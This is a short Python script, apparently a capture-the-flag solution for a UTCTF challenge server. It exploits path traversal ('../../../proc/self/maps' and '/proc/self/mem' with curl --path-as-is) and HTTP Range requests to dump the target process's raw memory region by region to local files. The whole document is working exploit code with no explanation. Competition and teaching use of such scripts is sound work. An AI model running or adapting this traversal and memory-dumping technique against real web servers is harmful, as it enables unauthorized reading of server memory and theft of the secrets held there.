import re
import os
memory = "http://guppy.utctf.live:7884/../../../proc/self/mem"

os.system("curl --path-as-is -H 'Range: bytes=0-494' http://guppy.utctf.live:7884/../../../proc/self/maps > maps.txt")

with open("maps.txt") as f:
    maps_contents = f.readlines()

for line in maps_contents: 
    r = re.compile(r"([0-9a-f]+)-([0-9a-f]+)")
    match = r.match(line)
    if match:
        start_addr, end_addr = match.groups()

        start_addr = int(start_addr, 16)
        end_addr = int(end_addr, 16) - 1

        output_file = f"memory_{start_addr}_{end_addr}.bin"

        range_header = f"bytes={start_addr}-{end_addr}"
        os.system(f"curl --path-as-is -H 'Range: {range_header}' -s {memory} -o {output_file}")
        print(f"Download memory_{start_addr}_{end_addr}.bin")
